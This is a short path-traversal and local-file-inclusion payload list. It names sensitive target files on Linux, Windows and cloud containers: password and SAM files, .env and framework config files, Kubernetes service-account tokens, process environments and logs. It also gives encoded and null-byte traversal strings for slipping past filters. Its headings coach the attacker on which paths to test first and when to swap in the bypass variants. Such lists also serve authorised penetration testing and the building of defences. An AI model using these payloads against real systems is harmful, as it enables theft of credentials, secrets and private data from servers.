=== Linux — OS-level / universal (always test first, confirms traversal primitive) ===

/etc/passwd
/etc/hosts
/etc/hostname

/etc/issue

/proc/self/environ

/proc/version

/proc/self/cmdline

=== Linux — app config by framework (use once stack is identified or suspected) ===

.env

.env.local

.env.production

config/database.yml

config/secrets.yml

application.yml

application.properties

settings.py

wp-config.php

wp-config.php.bak

config.php

configuration.php

.git/config

.git/HEAD

.htaccess

.htpasswd

docker-compose.yml

Dockerfile

=== Windows ===

C:\Windows\System32\drivers\etc\hosts

C:\Windows\win.ini

C:\Windows\System32\config\SAM

C:\inetpub\wwwroot\web.config

C:\xampp\apache\conf\httpd.conf

C:\Program Files\MySQL\my.ini

=== Cloud / container specific ===

/proc/1/environ

/.dockerenv

/run/secrets/

/var/run/secrets/kubernetes.io/serviceaccount/token

=== Log files (can leak session tokens, PII, stack traces) ===

/var/log/apache2/access.log

/var/log/nginx/access.log

/var/log/auth.log

=== Null-byte / encoding bypass variants to pair with any path above ===

(swap in when raw traversal is blocked/stripped)

../../../etc/passwd%00

..%2f..%2f..%2fetc%2fpasswd

....//....//....//etc/passwd

%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
